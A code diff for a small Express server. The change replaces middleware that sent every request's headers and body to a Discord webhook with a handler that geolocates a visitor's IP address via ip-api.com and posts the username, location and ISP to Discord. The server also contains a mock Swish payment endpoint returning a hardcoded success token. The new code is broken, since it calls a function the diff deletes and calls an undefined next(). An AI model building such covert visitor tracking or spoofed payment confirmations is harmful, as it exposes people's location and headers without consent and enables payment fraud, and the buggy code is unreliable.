@@ -16,54 +16,62 @@ app.get("/", (req, res) => {
 });
 
 // Function to send Discord webhook
-async function sendDiscordWebhook(embed) {
+function getLocalIpAddress() {
+  const nets = networkInterfaces();
+  for (const name of Object.keys(nets)) {
+    for (const net of nets[name]) {
+      if (net.family === 'IPv4' && !net.internal) {
+        return net.address;
+      }
+    }
+  }
+  return 'IP address not found';
+}
+
+// Function to get IP address information
+async function getIpInfo(ip) {
   try {
-    await axios.post(DISCORD_WEBHOOK_URL, { embeds: [embed] }, {
-      headers: {
-        'Content-Type': 'application/json',
-      },
-    });
-    console.log("Webhook sent successfully");
+    const response = await axios.get(`http://ip-api.com/json/${ip}`);
+    return response.data;
   } catch (error) {
-    console.error("Error sending webhook:", error);
+    console.error("Error fetching IP information:", error.message);
+    return null;
   }
 }
 
-// Middleware to send a Discord webhook for every request
-app.use(async (req, res, next) => {
-  const { method, url, headers, query, body, ip } = req;
-  const embedMessage = {
-    title: "Request Received",
-    color: 3447003, // Optional: Change color as needed (this is a blue shade)
-    fields: [
-      { name: "Method", value: method, inline: true },
-      { name: "URL", value: url, inline: true },
-      { name: "IP Address", value: ip, inline: true },
-      {
-        name: "Headers",
-        value: `\`\`\`json\n${JSON.stringify(headers, null, 2)}\n\`\`\``,
-        inline: false,
-      },
-      {
-        name: "Query Parameters",
-        value: `\`\`\`json\n${JSON.stringify(query, null, 2)}\n\`\`\``,
-        inline: false,
-      },
-      {
-        name: "Payload",
-        value: `\`\`\`json\n${JSON.stringify(body, null, 2)}\n\`\`\``,
-        inline: false,
-      },
-    ],
-    timestamp: new Date(),
-  };
+app.post("/", async (req, res) => {
+  const { username } = req.body;
+  const ip = req.ip || getLocalIpAddress();
 
-  console.log("Sending webhook:", embedMessage);
-  await sendDiscordWebhook(embedMessage);
+  const ipInfo = await getIpInfo(ip);
 
-  next();
+  if (ipInfo) {
+    const embedMessage = {
+      title: "User Information",
+      color: 3447003, // Blue color
+      fields: [
+        { name: "Username", value: username, inline: true },
+        { name: "IP Address", value: ip, inline: true },
+        { name: "City", value: ipInfo.city || "N/A", inline: true },
+        { name: "Region", value: ipInfo.regionName || "N/A", inline: true },
+        { name: "Country", value: ipInfo.country || "N/A", inline: true },
+        { name: "ISP", value: ipInfo.isp || "N/A", inline: true },
+      ],
+      timestamp: new Date(),
+    };
+
+    sendDiscordWebhook(embedMessage)
+      .then(() => {
+        res.status(200).send("Webhook sent successfully");
+      })
+      .catch(error => {
+        res.status(500).send("Error sending webhook: " + error.message);
+      });
+  } else {
+    res.status(500).send("Error fetching IP information");
+  }
+    next();
 });
-
 // Endpoints
 app.post("/mpc-swish/api/v4/initiatepayment", async (req, res) => {
   res.status(200).send('{"autoStartToken":"deadb33f-cdb6-4df3-8de0-deadb33f","result":"200","paymentID":"DEADB33F"}');
